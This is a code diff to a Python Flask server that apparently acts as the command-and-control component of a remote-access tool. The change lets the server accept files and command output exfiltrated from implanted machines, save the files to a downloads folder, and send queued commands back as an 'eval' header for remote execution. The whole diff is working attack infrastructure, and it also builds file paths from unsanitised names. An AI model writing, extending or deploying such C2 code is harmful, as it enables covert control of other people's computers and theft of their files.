@@ -2,7 +2,7 @@ import logging
 import os
 import urllib.parse as parse
 
-from connect import color, connection, util
+from connect import color, connection, loader, util
 from flask import Flask, make_response, render_template, request, send_file
 
 app = Flask(__name__)
@@ -27,19 +27,24 @@ def serve_stagers(format_id):
 
 @app.route(f'{checkin_uri}', methods=['POST'])
 def checkin():
-    post_data = dict(request.get_json(force=True)) #figure it out force=true
-    color.verbose(f'{post_data} made to {checkin_uri}')
+    data = request.get_data()
     response = make_response(render_template('connection_template.html', random_data=util.random_data))
     try:
-        connection = engine.retrieve_connection(post_data['connection_id'])
+        connection = engine.retrieve_connection(request.headers['Connection-ID'])
     except:
         return response
     connection.check_in()
     internet_addr = connection.system_information['ip']
-    if 'results' in post_data.keys():
-        color.normal('\n')
-        color.information(f'results recieved ({internet_addr})')
-        color.normal(parse.unquote(post_data['results']))
+    if data:
+        if request.headers['mimetype'] == 'text/plain':
+            color.normal('\n')
+            color.information(f'Results recieved from ({internet_addr}):')
+            color.normal(str(data,'utf-8'))
+        else:
+            filename = util.generate_str()
+            color.normal('\n')
+            color.information(f'File recieved from ({internet_addr}) saving to downloads/{filename}.')
+            loader.download(data, filename)
     if connection.job_queue:
         job = connection.job_queue.pop(0)
         if job.type == 'function':
@@ -54,7 +59,11 @@ def checkin():
             if 'file:' in arguments[0]:
                 filename = arguments[0].split(':')[1]
                 arguments[0] = 'response.ResponseBody'
-                response = make_response(send_file(f'templates/uploads/{filename}'))
+                try:
+                    response = make_response(send_file(f'uploads/{filename}'))
+                except:
+                    color.information('File does not exist.')
+                    return response 
             arguments = ','.join(arguments)
             response.headers['eval'] = parse.quote(f'{command}({arguments})')
             return response
